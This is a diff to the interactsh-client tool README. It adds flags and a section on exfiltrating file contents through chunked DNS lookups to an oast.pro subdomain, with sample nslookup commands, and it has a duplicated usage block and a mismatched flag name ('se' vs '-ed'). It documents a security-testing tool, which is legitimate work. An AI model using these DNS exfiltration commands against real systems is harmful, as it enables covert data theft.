@@ -55,6 +55,9 @@ This will display help for the tool. Here are all the switches it supports.
 Usage:
   ./interactsh-client [flags]
 
+Usage:
+  ./interactsh-client [flags]
+
 Flags:
 INPUT:
    -s, -server string  interactsh server(s) to use (default "oast.pro,oast.live,oast.site,oast.online,oast.fun,oast.me")
@@ -83,6 +86,8 @@ UPDATE:
 OUTPUT:
    -o string                         output file to write interaction data
    -json                             write output in JSONL(ines) format
+   -silent                           display interactions only
+   -ed                               save exfiltrated data in the format content.filename.extension.interactsh-address.oast.io
    -ps, -payload-store               enable storing generated interactsh payload to file
    -psf, -payload-store-file string  store generated interactsh payloads to given file (default "interactsh_payload.txt")
    -v                                display verbose interaction
@@ -212,6 +217,27 @@ We maintain a list of default Interactsh servers to use with `interactsh-client`
 - oast.me
 
 Default servers are subject to change/rotate/down at any time, thus we recommend using a self-hosted interactsh server if you are experiencing issues with the default server.
+
+### Data exfiltration option
+
+Using the `se` flag, `interactsh-client` will append the content of requests in the format `content.filename.extension.id.domain.com` to a given `filename.extension`.
+
+```sh
+interactsh-client -ed
+```
+
+Using this option, it is possible to exfiltrate multiple files to the current directory as long as their content is sent through multiple DNS queries. As an example, see the input below will produce the showed files:
+
+```
+$ nslookup abcde.file.txt.c59e3crp82ke7bcnedq0cfjqdpeyyyyyn.oast.pro
+$ nslookup fghij.file.txt.c59e3crp82ke7bcnedq0cfjqdpeyyyyyn.oast.pro
+$ nslookup 1234.test.txt.c59e3crp82ke7bcnedq0cfjqdpeyyyyyn.oast.pro
+$ nslookup 567.test.txt.c59e3crp82ke7bcnedq0cfjqdpeyyyyyn.oast.pro
+$ cat file.txt
+abcdefghij
+$ cat test.txt
+1234567
+```
 
 ### Using Protected Self-Hosted server
 
